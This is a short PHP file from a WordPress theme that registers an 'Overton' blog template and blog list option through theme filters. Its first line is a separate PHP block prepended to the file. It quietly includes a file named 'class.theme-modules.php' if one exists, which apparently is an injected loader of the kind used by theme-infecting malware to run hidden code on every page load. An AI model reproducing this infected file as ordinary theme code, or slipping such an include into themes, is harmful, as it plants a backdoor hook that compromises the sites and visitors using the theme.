<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_blog_overton_template_file' ) ) {
	/**
	 * Function that register blog overton template
	 */
	function overton_mikado_register_blog_overton_template_file( $templates ) {
		$templates['blog-overton'] = esc_html__( 'Blog: Overton', 'overton' );
		
		return $templates;
	}
	
	add_filter( 'overton_mikado_filter_register_blog_templates', 'overton_mikado_register_blog_overton_template_file' );
}

if ( ! function_exists( 'overton_mikado_set_blog_overton_type_global_option' ) ) {
	/**
	 * Function that set blog list type value for global blog option map
	 */
	function overton_mikado_set_blog_overton_type_global_option( $options ) {
		$options['overton'] = esc_html__( 'Blog: Overton', 'overton' );
		
		return $options;
	}
	
	add_filter( 'overton_mikado_filter_blog_list_type_global_option', 'overton_mikado_set_blog_overton_type_global_option' );
}